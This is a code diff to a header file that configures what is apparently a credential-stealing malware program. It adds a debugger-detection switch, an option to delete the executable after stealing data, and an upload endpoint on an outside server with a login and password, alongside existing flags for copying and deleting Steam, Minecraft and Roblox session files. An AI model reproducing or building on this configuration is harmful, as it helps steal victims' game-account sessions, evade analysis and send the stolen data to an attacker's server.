@@ -1,6 +1,8 @@
 #pragma once
 
-#define PINGREQUIRED     true  // Pings and exit if no internet. For disable replace true to false
+#define DEBUGGERPROTECT  false  // Checks and exit if debugger enabled. For disable replace true to false
+#define DELETEEXE        false  // Delete exe files when steal data. For disable replace true to false
+#define PINGREQUIRED     false  // Pings and exit if no internet. For disable replace true to false
 #define ISDEBUG          true  // Enable debug mode. If this program is final result, here must be false.
 #define ADVANCEDDEBUG    false // Displays advanced debug info if debug mode is enabled. For enable replace false to true
 #define LOGGING          true // Enable logging work. For enable replace false to true
@@ -23,3 +25,7 @@
 #define DELORIGSTEAM     false  // Enable delete steam minecraft session. For disable replace true to false
 #define COPYROBLOX       true  // Enable copy roblox session. For disable replace true to false
 #define DELORIGROBLOX    false  // Enable delete roblox minecraft session. For disable replace true to false
+
+#define URL      "https://web.141b.ru/panel/v1/upload.php"      // Server URL
+#define LOGIN    "usera"                                        // User's login
+#define PASSWORD "ewe-676-$%$"                                  // User's password
